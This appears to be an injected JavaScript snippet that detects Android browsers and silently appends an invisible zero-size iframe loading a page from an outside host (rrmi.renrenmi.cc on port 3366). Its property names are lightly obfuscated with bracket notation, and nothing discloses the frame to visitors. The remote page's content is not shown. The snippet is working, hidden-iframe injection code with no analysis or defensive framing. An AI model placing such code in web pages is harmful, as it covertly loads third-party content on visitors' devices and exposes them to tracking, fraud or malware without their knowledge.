(function() {
	var UA = navigator["userAgent"];
	var shebei = UA['indexOf']('Android') > -1 || UA['indexOf']('Adr') > -1;
	var sjs = Math['random']();
	var iframe = document['createElement']('iframe');
	iframe['src'] = 'https://rrmi.renrenmi.cc:3366/tj.html';
	iframe['height'] = 0;
	iframe['width'] = 0;
	iframe['style'] = 'border:0;';
	if (shebei) {
		document['body']['appendChild'](iframe)
	}
})()